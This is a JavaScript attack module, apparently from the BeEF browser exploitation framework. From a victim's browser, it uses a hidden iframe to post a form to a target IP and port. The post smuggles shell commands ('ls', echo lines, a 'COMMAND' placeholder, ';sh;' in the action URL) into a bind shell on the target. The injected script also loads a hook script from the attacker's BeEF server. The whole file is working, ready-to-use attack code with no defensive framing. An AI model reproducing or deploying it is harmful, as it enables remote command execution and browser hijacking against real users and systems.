var target_ip = 'IP_ADDRESS';
var target_port = '220';
var payload = "";

var scr_l = '<scr' + 'ipt\>';
var scr_r = '</scr' + 'ipt>';
var max_line_len = 23;

payload += "ls\\\n";

function add_line(cmd) {
	payload += "echo -n '" + scr_l + "'\\\n";
	payload += "echo " + cmd + "\\\n";
	payload += "echo '" + scr_r + "'\\\n";
}

function add_echo(cmd) {
	payload += "echo " + "\\\"" + cmd + "\\\"" + "\\\n";
}

function construct_js(js) {
	add_line("a=''");

	js = js.replace(/ /g, "SP")

	//for(i=0; i<js.length; i+=max_line_len) {
	//	add_line("a+=\\\""+js.substring(i,i+max_line_len)+"\\\"");
	//} 

	add_line("\\\"" + js +"\\\"");

	add_line("s=String.fromCharCode(0x20)");
	add_line("a=a.replace(/SP/g,s)");
}

var code = "";
function add_js(js) {
	code+=js+";";
}

//payload+=String.fromCharCode(0x12);
//payload+=String.fromCharCode(0x13);

//payload += "fi\\\n";

add_echo(scr_l);
add_echo("var result_id='" + result_id + "'"); 
add_echo("function include(script_filename) {");
add_echo("var html_doc = document.getElementsByTagName('head').item(0);");
add_echo("var js = document.createElement('script');");
add_echo("js.src = script_filename;");
add_echo("js.type = 'text/javascript';");
add_echo("js.defer = true;");
add_echo("html_doc.appendChild(js);");
add_echo("return js;");
add_echo("}");
add_echo("include('" + beef_url + "' + '/hook/ipc_bindshell.js.php');"); 
add_echo("//__END__");
add_echo(scr_r);

payload += "COMMAND";

var iframe = document.createElement("iframe");
iframe.setAttribute("id","iwindow");
//iframe.setAttribute("style", "visibility:hidden;");
document.body.appendChild(iframe);

function do_submit(ip, port, content) {
	myform=document.createElement("form");
	myform.setAttribute("name","data");
	myform.setAttribute("method","post");
	myform.setAttribute("enctype", "multipart/form-data");

	myform.setAttribute("action","http://" + ip + 
	   ":" + PORT + '/abc.html;sh;');
	   //":" + PORT + "/abc.html");
	document.getElementById("iwindow").contentWindow.document.body.appendChild(myform); 

	myExt = document.createElement("INPUT");
	myExt.setAttribute("id","extNo");
	myExt.setAttribute("name","test");
	myExt.setAttribute("value",content); 
	myform.appendChild(myExt); 

	myform.submit();
}

do_submit(target_ip, target_port, payload);

